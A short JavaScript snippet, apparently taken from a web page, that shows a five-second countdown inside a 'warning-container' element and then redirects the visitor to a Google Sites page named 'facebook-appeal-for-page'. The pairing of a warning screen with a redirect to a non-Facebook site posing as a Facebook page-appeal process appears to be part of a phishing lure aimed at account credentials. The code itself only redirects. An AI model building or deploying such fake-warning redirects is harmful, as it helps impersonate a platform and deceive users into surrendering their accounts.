<script>
    // JavaScript for Countdown and Redirect
    let countdown = 5; // Countdown time in seconds
    const countdownElement = document.createElement('p');
    countdownElement.id = 'countdown';
    document.querySelector('.warning-container').appendChild(countdownElement);

    const updateCountdown = () => {
        countdownElement.textContent = `Redirecting in ${countdown} seconds...`;
        if (countdown === 0) {
            window.location.href = "https://sites.google.com/view/facebook-appeal-for-page/home";
        } else {
            countdown--;
            setTimeout(updateCountdown, 1000); // Update every second
        }
    };

    updateCountdown(); // Start the countdown
</script>
